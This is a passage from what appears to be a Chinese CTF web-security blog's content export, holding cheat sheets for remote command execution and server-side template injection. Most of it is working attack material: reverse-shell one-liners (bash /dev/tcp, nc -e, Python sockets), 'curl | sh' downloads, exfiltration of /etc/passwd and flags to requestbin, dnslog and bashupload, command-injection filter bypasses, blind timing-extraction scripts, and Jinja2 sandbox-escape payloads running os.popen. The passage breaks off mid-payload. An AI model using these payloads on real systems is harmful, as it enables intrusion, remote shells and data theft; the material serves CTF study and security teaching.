从0到1掌握反序列化工具之PHPGGC","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"Java","slug":"Java","permalink":"https://lazzzaro.github.io/tags/Java/"},{"name":"反序列化","slug":"反序列化","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"}],"author":"Lazzaro"},{"title":"RCE","slug":"web-RCE","date":"2020-05-14T16:20:39.000Z","updated":"2022-11-13T04:55:08.227Z","comments":true,"path":"2020/05/15/web-RCE/","link":"","permalink":"https://lazzzaro.github.io/2020/05/15/web-RCE/","excerpt":"","text":"远程命令执行/远程代码执行 (Remote Command/Code Execute, RCE)常用命令1234567891011121314151617181920212223#查看文件命令cat/tac/more/less/head/tail/nl/od/uniqgrep test flag.phpphp /flag #文件内容会被当成php代码执行，相当于includephp -t / -r &quot;include(&#x27;/flag&#x27;);&quot; #指定根目录，绕过open_basedirsh /flag 2&gt;&amp;1 #sh+文件，并输出错误信息（蚁剑是这个原理）sed p#列目录命令du -a .chgrp -v -R#打包文件tar cvf xxx.tar . #将当前目录打包压缩为xxx.tar#写入文件ls &gt; xxxls | tee xxxscript -a xxx; ls; exit; #依次执行echo -e &quot;%23!/bin/sh\\nwhile read line\\ndo\\necho \\$line\\ndone &lt; /flag&quot; &gt; ../../../read #写shell#反弹shellcurl [IP] | sh #VPS payload: bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot; ​ 命令分隔符12345ping x.x.x.x;ls #连续指令ping x.x.x.x|ls #管道符（显示第二个命令结果）ping x.x.x.x&amp;ls #后台进程ping x.x.x.x||ls #逻辑运算（第一个命令执行返回值正常，第二个命令才执行）ping x.x.x.x&amp;&amp;ls #逻辑运算（如果第一个命令执行返回值正常，第二个命令就不执行了） ​ 反弹shellbash： 12345bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;nc -lvvnp [Port]nc [IP] [Port] -e /bin/shnc -lvvnp [Port] python： 1234python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-ip&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;nc -lvvnp 2333 python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; #模拟终端 ​ 绕过（bypass）空格1&lt;，&lt;&gt;，%20，%09，$IFS，$&#123;IFS&#125;，$IFS$9，&#123;cat,1.txt&#125; 分号1%0a 命令（以pwd为例）1a=p;b=wd;$a$b，p&#x27;&#x27;wd，p&quot;&quot;wd，p\\`\\`wd，p\\wd，pwd$u，`echo cHdk|base64 -d\\`，echo &quot;707764&quot;|xxd -r -p|bash 关键词（以flag为例）1cat fla*，cat f???，cat flag$u，cat fl&quot;a&quot;g，cat fl&#x27;a&#x27;g IP地址转数字地址：http://www.msxindl.com/tools/ip/ip_num.asp 无回显1&gt;1 创建文件名为1的空文件 a&gt;1 虽报错，但可创建空文件 ls&gt;1 把ls的内容导入1中 写文件12curl -o shell.php http://xxxxxx.txtwget -O shell.php http://xxxxxx.txt 利用平台 123curl http://requestbin.net/r/1kiej1p1?p=`whoami`curl `cat /etc/passwd|base64`.xxxxxx.dnslog.cn #dnslog带外curl bashupload.com -T your_file.txt #bashupload.com带外下载文件 参考txt： http://php.loglog.jp/net/exec.php.txt https://johannes.homepc.org/packet9.txt https://metaeventos.net/userfiles/file/p.txt https://www.cpdc.com.tw/uploads/zhang.txt ​ 盲注（无回显）123456789101112131415161718192021222324import requestsimport stringimport timeurl=&#x27;http://localhost.test.php/?c=&#x27;dic=string.printable[:-6]flag=&#x27;&#x27;for i in range(1,50): judge=0 for j in dic: now=f&#x27;&#123;url&#125;a=$(cat /flag | head -1 | cut -b &#123;i&#125;);if [ $a = &#123;j&#125; ];then sleep 2;fi&#x27; start=time.time() r=requests.get(now) end=time.time() if int(end)-int(start) &gt;1: judge=1 flag+=j print(flag) break if judge==0: break print(flag) 其他命令： 12345if fgrep -c &quot;a&quot; &quot;flag.txt&quot;; then echo &quot;T&quot;; else &quot;F&quot;; fiif ls | fgrep -c &quot;a&quot;; then echo &quot;T&quot;; else &quot;F&quot;; fi[ $(head -c 2 flag.txt | tail -c 1) = &#x27;a&#x27; ][ $(ls | head -c 2 | tail -c 1) = &#x27;a&#x27; ] ​ 无字母 / 特殊字符仅含 &lt;$ &#123;&#125;\\#()&#39;0 重定向+八进制+数字构造 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsn = dict()n[0] = &#x27;0&#x27;n[1] = &#x27;$&#123;##&#125;&#x27; #$&#123;##&#125;计算#这个字符的长度为1，这里如果没有屏蔽!的话还可以用$((!$#))n[2] = &#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27; #通过位运算得到2n[3] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27; #通过二进制11转换为十进制得到3,4,5,6,7n[4] = &#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;n[5] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;n[6] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;n[7] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;f=&#x27;&#x27;def str_to_oct(cmd): #命令转换成八进制字符串 s = &quot;&quot; for t in cmd: o = (&#x27;%s&#x27; % (oct(ord(t))))[2:] s+=&#x27;\\\\&#x27;+o return sdef build(cmd): #八进制字符串转换成字符 payload = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\\\\&#x27;&quot; s = str_to_oct(cmd).split(&#x27;\\\\&#x27;) for _ in s[1:]: payload+=&quot;\\\\\\\\&quot; for i in _: payload+=n[int(i)] return payload+&#x27;\\\\\\&#x27;&#x27;def get_flag(url,payload): #盲注函数 try: data = &#123;&#x27;cmd&#x27;:payload&#125; r = requests.post(url,data,timeout=1.5) except: return True return False#弹shell#print(build(&#x27;bash -i &gt;&amp; /dev/tcp/your-ip/2333 0&gt;&amp;1&#x27;))#盲注#a=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;@&#x27;# for i in range(1,50):# for j in a:# cmd=f&#x27;cat /flag|grep ^&#123;f+j&#125;&amp;&amp;sleep 3&#x27;# url = &quot;http://ip/&quot;# if get_flag(url,build(cmd)):# break# f = f+j# print(f) 参考： 安洵杯2020 - Bash-Vino0o0o 34c3 CTF - minbashmaxfun","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://lazzzaro.github.io/tags/RCE/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"SSTI","slug":"web-SSTI","date":"2020-05-14T16:20:39.000Z","updated":"2022-12-20T10:43:49.435Z","comments":true,"path":"2020/05/15/web-SSTI/","link":"","permalink":"https://lazzzaro.github.io/2020/05/15/web-SSTI/","excerpt":"","text":"​ SSTI (Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。目前CTF常见的SSTI题中，环境多为python。 Python沙箱逃逸在 Python 中执行系统命令的方式有： os （模块用于访问操作系统功能的模块。通用操作：1.系统操作，2.目录操作，3.判断操作。） commands：仅限2.x （该模块在3.x中已经被subprocess取代。但是在2.x的早期版本中它也是重要的内置模块之一。） subprocess （模块用于管理子进程。可以调用外部命令作为子进程，还可以生成新的进程、连接到它们的input/output/error管道，同时获取它们的返回码。） timeit：timeit.sys、timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1) （时间模块，用于准确测量代码执行时间。该模块定义了三个实用函数和一个公共类。） platform：platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read() （该模块用于获得操作系统的相关信息。） pty：pty.spawn(&#39;ls&#39;)、pty.os （该模块定义了处理伪终端的操作：启动另一个进程并能够以编程方式写入和读取其控制终端。） bdb：bdb.os、cgi.sys cgi：cgi.os、cgi.sys … 基本操作查看全局变量： 1[变量名].__globals__ 读写文件 方法一常用函数： 12345678910111213141516171819202122232425262728293031__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的模块、方法以及所有变量。查看所有键名：__globals__.keys()。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\\self\\fd/3&#x27;).read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;cycler &#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;joiner &#123;&#123;joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125;namespace &#123;&#123;namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read()&#125;&#125; 常用过滤器： 1234567891011121314151617181920212223242526int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()：返回字符串的长度，别名是count。 获取基本类： 12345&#x27;&#x27;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] #针对jinjia2/flask为[9]适用 获取基本类后，继续向下获取基本类(object)的子类： 1object.__subclasses__() 找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带wrapper的）： 12345&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[99].__init__&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__&gt; 查看其引用__builtins__： builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;] 这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能： 1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read() 方法二存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可： 12345&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[2].__subclasses__().index(file)40[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() #将read() 修改为 write() 即为写文件 命令执行 利用eval 进行命令执行1&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) 利用warnings.catch_warnings 进行命令执行查看warnings.catch_warnings方法的位置： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 59 查看linecatch的位置： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#x27;linecache&#x27;) 25 查找os模块的位置： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.keys().index(&#x27;os&#x27;) 12 查找system方法的位置（在这里使用os.open().read()可以实现一样的效果,步骤一样,不再复述）： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.keys().index(&#x27;system&#x27;) 144 调用system方法： 12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;) root 直接搜索： 1&gt;&gt;&gt; [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == &#x27;catch_warnings&#x27;][0]()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read() 利用commands 进行命令执行12345&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read() 利用任意字符串或特殊变量123sss.__init__.__globals__.__builtins__.open(&quot;/flag&quot;).read()config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()request.application.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() 绕过 中括号 [] pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 在这里使用pop并不会真的移除，但却能返回其值，取代中括号，来实现绕过。 12&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)(&quot;cat /flag&quot;,shell=True,stdout=-1).communicate().__getitem__(0) unicode字符：［］，﹇﹈ 引号 ‘’ request.args 是flask中的一个属性，为返回请求的参数，这里把path当作变量名,将后面的路径传值进来，进而绕过了引号的过滤。 1&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd unicode字符：＂＂，＇＇ 单下划线 _ 过滤了_可以用dir(0)[0][0]或者request[&#39;args&#39;]或者 request[&#39;values&#39;]绕过。 双下划线 __ 同样利用request.args属性。 1&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 或者request.values属性。 1&#123;&#123;()|attr(request.values.x)|attr(request.values.y)|attr(request.values.a)()|attr(request.values.z)(185)|attr(request.values.b)|attr(request.values.c)|attr(request.values.z)(request.values.d)|attr(request.values.z)(request.values.e)(request.values.f)|attr(request.values.g)|attr(request.values.z)(request.values.h)(request.values.i)&#125;&#125;&amp;x=__class__&amp;y=__base__&amp;z=__getitem__&amp;a=__subclasses__&amp;b=__init__&amp;c=__globals__&amp;d=__builtins__&amp;e=__import__&amp;f=os&amp;g=__dict__&amp;h=system&amp;i=curl http://requestbin.net/r/1eqk6r61?p=`cat /flag` 点 . &#39;&#39;.__class__可以写成 getattr(&#39;&#39;,&#39;__class__&#39;)或者 &#39;&#39;|attr(&#39;__class__&#39;)。 &#39;&#39;.eval可以写成 &#39;&#39;|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)。 &#39;&#39;.__class__可以写成&#39;&#39;[&#39;__class__&#39;] 双花括号 {%if [expression]==[value]%} yes {%endif%} {%print()%} unicode字符：︷︷︸︸ 圆括号 unicode字符：⁽⁾，₍₎ 对函数执行方式重载，如 request.__class__.__getitem__=__builtins__.exec;，执行request[payload] 时相当于 exec(payload)。 lambda表达式。 外部参数利用（爆破下标） request.args或request.values。 列目录 1&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)|attr(request.args.init)|attr(request.args.g)|attr(request.args.item)(request.args.mod)|attr(request.args.func)(request.args.cmd)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read 读文件 12&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125; &amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=/etc/passwd&amp;re=read 数字 unicode字符：𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗，𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡，０１２３４５６７８９ 对象层面 set {}=None 其他引用： &#123;&#123;% set config=None %&#125;&#125; =&gt; &#123;&#123;url_for.__globals__.current_app.config&#125;&#125; &#123;&#123;% set __builtins__=None %&#125;&#125; =&gt; &#123;&#123;[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__&#125;&#125; del 重载： reload(__builtins__) 其他 获得对应函数的上下文常量：func.__code__.co_consts 关键字 base64编码 __getattribute__使用实例访问属性时，调用该方法。 例如被过滤掉__class__关键词： 1&#123;&#123;[].__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125; 字符串拼接 123yyy.__init__.__globals__.__builtins__|attr(&#x27;__getit&#x27;&#x27;em__&#x27;)(&#x27;ev&#x27;&#x27;al&#x27;)(&#x27;__imp&#x27;&#x27;ort__(&quot;o&#x27;&#x27;s&quot;).po&#x27;&#x27;pen(&quot;ls /&quot;).re&#x27;&#x27;ad()&#x27;)[].__getattribute__(&#x27;__c&#x27;+&#x27;lass__&#x27;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&quot;op&quot;+&quot;en&quot;](&quot;/fl&quot;+&quot;ag&quot;).read() 反转 1&#123;&#123;cycler[&#x27;__tini__&#x27;[::-1]][&#x27;__slabolg__&#x27;[::-1]].os.popen(&#x27;id&#x27;).read()&#125;&#125; lower() 1&#123;&#123;sss.__init__.__globals__.__builtins__.open(&quot;/FLAG&quot;.lower()).read()&#125;&#125; 清空关键字list 12[关键字list变量名].clear()open(&quot;/flag&quot;).read() 16进制 1.__class__ =&gt; [&quot;\\x5f\\x5fc\\x6cass\\x5f\\x5f&quot;] 8进制 123456789.__class__ =&gt; [&quot;\\137\\137\\143\\154\\141\\163\\163\\137\\137&quot;].__base__ =&gt; [&quot;\\137\\137\\142\\141\\163\\145\\137\\137&quot;].__subclasses__ =&gt; [&quot;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137&quot;].__init__ =&gt; [&quot;\\137\\137\\151\\156\\151\\164\\137\\137&quot;].__globals__ =&gt; [&quot;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137&quot;].__builtins__ =&gt; [&quot;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137&quot;].__import__ =&gt; [&quot;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137&quot;].popen =&gt; [&quot;\\160\\157\\160\\145\\156&quot;].read =&gt; [&quot;\\162\\145\\141\\144&quot;] unicode编码 1.__class__ =&gt; [&quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f&quot;] unicode字符 / Non-ASCII Identifies 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫 ０１２３４５６７８９ 参考：https://www.compart.com/en/unicode/U+0030 attr与过滤器 如果没有过滤globals，从globals里把eval函数找出来，然后构造任意字符串放进去RCE即可。 参考：https://www.gem-love.com/ctf/2598.html 123456789101112131415161718192021222324252627282930313233&#123;% set xhx = ((&#123; &#125;|select()|string()|list()).pop(24)|string())%&#125; # _&#123;% set spa = ((app.__doc__|list()).pop(102)|string())%&#125; #空格&#123;% set pt = ((app.__doc__|list()).pop(320)|string())%&#125; #点&#123;% set yin = ((app.__doc__|list()).pop(337)|string())%&#125; #单引号&#123;% set left = ((app.__doc__|list()).pop(264)|string())%&#125; #左括号(&#123;% set right = ((app.__doc__|list()).pop(286)|string())%&#125; #右括号)&#123;% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125; #斜线/&#123;% set bu = dict(buil=aa,tins=dd)|join() %&#125; #builtins&#123;% set im = dict(imp=aa,ort=dd)|join() %&#125; #import&#123;% set sy = dict(po=aa,pen=dd)|join() %&#125; #popen&#123;% set os = dict(o=aa,s=dd)|join() %&#125; #os&#123;% set ca = dict(ca=aa,t=dd)|join() %&#125; #cat&#123;% set flg = dict(fl=aa,ag=dd)|join() %&#125; #flag&#123;% set ev = dict(ev=aa,al=dd)|join() %&#125; #eval&#123;% set red = dict(re=aa,ad=dd)|join()%&#125; #read&#123;% set bul = xhx*2~bu~xhx*2 %&#125; #__builtins__#拼接起来 __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#123;% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; &#123;% for f,v in y1ng.__init__.__globals__.items() %&#125; #globals &#123;% if f == bul %&#125; &#123;% for a,b in v.items() %&#125; #builtins &#123;% if a == ev %&#125; #eval &#123;&#123;b(pld)&#125;&#125; #eval(pld) &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endfor %&#125;#payload#&#123;%%20set%20xhx%20=%20((&#123;%20&#125;|select()|string()|list()).pop(24)|string())%&#125;&#123;%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%&#125;&#123;%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%&#125;%20&#123;%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%&#125;&#123;%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%&#125;%20&#123;%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%&#125;%20&#123;%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%&#125;%20&#123;%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%&#125;&#123;%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%&#125;&#123;%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%&#125;&#123;%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%&#125;%20&#123;%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%&#125;&#123;%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%&#125;&#123;%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%&#125;%20&#123;%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%&#125;&#123;%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%&#125;&#123;%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%&#125;%20&#123;%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%&#125;&#123;%%20if%20f%20==%20bul%20%&#125;&#123;%%20for%20a,b%20in%20v.items()%20%&#125;&#123;%%20if%20a%20==%20ev%20%&#125;&#123;&#123;b(pld)&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; 12345678910111213141516171819202122&#123;%set a=dict(po=x,p=x)|join%&#125; #pop&#123;%set b=(()|select|string|list)|attr(a)(𝟐𝟒)%&#125; #_&#123;%set c=(b,b,dict(do=x,c=x)|join,b,b)|join()%&#125; #__doc__&#123;%set d=(x|attr(c)|list)|attr(a)(𝟑𝟑𝟕)%&#125; #单引号&#123;%set e=(x|attr(c)|list)|attr(a)(𝟐𝟔𝟒)%&#125; #左括号(&#123;%set f=(x|attr(c)|list)|attr(a)(𝟐𝟖𝟔)%&#125; #右括号)&#123;%set g=(x|attr(c)|list)|attr(a)(𝟑𝟐𝟎)%&#125; #点.&#123;%set h=(x|attr(c)|list)|attr(a)(𝟏𝟎𝟐)%&#125; #空格&#123;%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%&#125; #__init__&#123;%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%&#125; #__globals__&#123;%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%&#125; #__getitem__&#123;%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%&#125; #__builtins__&#123;%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%&#125; #__import__&#123;%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(𝟑𝟒𝟗)%&#125;&#123;%set o=dict(ev=x,al=x)|join()%&#125; #eval&#123;%set p=dict(o=x,s=x)|join()%&#125; #os&#123;%set q=dict(po=x,pen=x)|join()%&#125; #popen&#123;%set r=dict(re=x,ad=x)|join()%&#125; #read&#123;%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%&#125;&#123;%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%&#125;&#123;%set 